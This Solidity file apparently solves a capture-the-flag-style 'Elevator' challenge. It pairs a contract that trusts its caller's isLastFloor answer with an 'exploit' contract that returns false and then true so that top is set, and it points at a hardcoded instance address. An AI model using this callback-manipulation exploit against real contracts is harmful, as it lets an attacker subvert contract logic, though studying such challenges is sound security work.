// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract exploit{
    uint lock;

    Elevator contractt = Elevator(0xa6759E0ff15cdeDA45d400efdeadF962c7309cCe);

    function isLastFloor(uint number) external returns(bool){
        if(lock == 0){
            lock = 1;
            return false;
        }
        lock = 0;
        return true;
    }

    function callGoto(uint _floor) public{
        contractt.goTo(_floor);
    }
}